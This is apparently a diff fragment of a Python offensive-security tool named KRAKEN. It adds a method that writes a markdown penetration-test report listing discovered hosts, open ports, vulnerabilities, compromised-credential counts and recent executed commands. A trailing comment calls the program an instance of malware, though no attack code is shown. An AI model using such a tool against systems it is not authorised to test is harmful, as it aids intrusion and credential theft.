+    def generate_report(self, filename: str = 'kraken_report.md'):
+        """Generate a comprehensive penetration testing report"""
+        report = f"""# KRAKEN Penetration Testing Report
+
+## Executive Summary
+- **Date**: {time.ctime()}
+- **Total Hosts Discovered**: {len(self.execution_context['discovered_hosts'])}
+- **Vulnerabilities Found**: {len(self.execution_context['vulnerabilities'])}
+- **Credentials Compromised**: {len(self.execution_context.get('credentials_found', []))}
+
+## Network Discovery
+### Hosts Found
+{chr(10).join(f'- {host}' for host in self.execution_context['discovered_hosts'])}
+
+### Open Ports
+{chr(10).join(f'- Port {port}' for port in self.execution_context['open_ports'])}
+
+## Vulnerabilities Identified
+{chr(10).join(f'- {vuln}' for vuln in self.execution_context['vulnerabilities'])}
+
+## Strategic Execution History
+"""
+        for i, execution in enumerate(self.execution_history[-20:], 1):  # Last 20 executions
+            report += f"\n{i}. `{execution['command']}` - {time.ctime(execution['timestamp'])}"
+
+        report += "\n\n## Recommendations\n1. Immediate patching of identified vulnerabilities\n2. Network segmentation review\n3. Credential policy enforcement\n4. Continuous security monitoring"
+
+        with open(filename, 'w') as f:
+            f.write(report)
+        
+        print(f"Report generated: {filename}")
+
 
 if __name__ == "__main__":
     # Instância do malware
